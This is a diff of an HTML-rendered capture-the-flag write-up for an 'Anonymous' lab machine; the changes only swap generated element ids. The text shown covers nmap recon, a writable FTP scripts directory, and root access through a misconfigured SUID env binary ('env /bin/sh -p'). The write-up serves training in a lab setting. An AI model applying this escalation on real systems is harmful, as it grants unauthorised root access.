@@ -22,20 +22,20 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org90a11fc">Recon</a>
+<li><a href="#org3fef948">Recon</a>
 <ul>
-<li><a href="#org66a5f0d">FTP Server</a></li>
+<li><a href="#org142dafc">FTP Server</a></li>
 </ul>
 </li>
-<li><a href="#orgdcad40f">Privilege escalation</a></li>
-<li><a href="#orgbf5541a">Conclusion</a></li>
+<li><a href="#orgf959484">Privilege escalation</a></li>
+<li><a href="#org9e31e6e">Conclusion</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org90a11fc" class="outline-2">
-<h2 id="org90a11fc"><a href="#org90a11fc">Recon</a></h2>
-<div class="outline-text-2" id="text-org90a11fc">
+<div id="outline-container-org3fef948" class="outline-2">
+<h2 id="org3fef948"><a href="#org3fef948">Recon</a></h2>
+<div class="outline-text-2" id="text-org3fef948">
 <ul class="org-ul">
 <li>adding to <code>/etc/hosts</code></li>
 </ul>
@@ -45,7 +45,7 @@
 We start by doing a quick scan on the target machine:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org8f5f368">nmap -sV -sC -oN nmap.initial anonymous.thm
+<pre class="src src-bash" id="org86c5dad">nmap -sV -sC -oN nmap.initial anonymous.thm
 </pre>
 </div>
 
@@ -69,9 +69,9 @@ nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </div>
 </div>
 
-<div id="outline-container-org66a5f0d" class="outline-3">
-<h3 id="org66a5f0d"><a href="#org66a5f0d">FTP Server</a></h3>
-<div class="outline-text-3" id="text-org66a5f0d">
+<div id="outline-container-org142dafc" class="outline-3">
+<h3 id="org142dafc"><a href="#org142dafc">FTP Server</a></h3>
+<div class="outline-text-3" id="text-org142dafc">
 <p>
 Visiting the ftp server (and in <code>nmap</code>&rsquo;s output), we see that there is a
 directory <code>scripts</code>, whose contents may be useful to us:
@@ -97,7 +97,7 @@ Since I&rsquo;m writing this article while completing the room, I did not
 have to wait much before getting the log file again and comparing it
 with the older version:
 </p>
-<pre class="example" id="org077070d">
+<pre class="example" id="orgba53eea">
 root@ip-10-10-121-199:~# cat removed_files.log | wc -l
 28
 # Here I went back to the ftp server got the file again
@@ -119,15 +119,15 @@ access to the machine!
 </div>
 </div>
 
-<div id="outline-container-orgdcad40f" class="outline-2">
-<h2 id="orgdcad40f"><a href="#orgdcad40f">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-orgdcad40f">
+<div id="outline-container-orgf959484" class="outline-2">
+<h2 id="orgf959484"><a href="#orgf959484">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-orgf959484">
 <p>
 After making our terminal a little more usable with <code>python</code>&rsquo;s pty module, we see that we are logged in as <code>namelessone</code>, who is part of
 many groups, however, since we do not know the user&rsquo;s password <code>sudo -l</code>
 is unusable.
 </p>
-<pre class="example" id="org66a4f87">
+<pre class="example" id="orgcdfbd02">
 namelessone@anonymous:~$ id
 id
 uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
@@ -138,7 +138,7 @@ uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(c
 Searching for files with <code>SUID</code>, we <code>find</code> (pun intended), that <code>env</code> is
 improperly configured, allowing for an easy privilege escalation:
 </p>
-<pre class="example" id="org225ec00">
+<pre class="example" id="orgbad8446">
 namelessone@anonymous:~$ env /bin/sh -p
 env /bin/sh -p
 # whoami
@@ -149,9 +149,9 @@ root
 </div>
 
 
-<div id="outline-container-orgbf5541a" class="outline-2">
-<h2 id="orgbf5541a"><a href="#orgbf5541a">Conclusion</a></h2>
-<div class="outline-text-2" id="text-orgbf5541a">
+<div id="outline-container-org9e31e6e" class="outline-2">
+<h2 id="org9e31e6e"><a href="#org9e31e6e">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org9e31e6e">
 <p>
 I do not know why this room was marked as being one of medium
 difficulty, but I liked being able to complete it really easily and
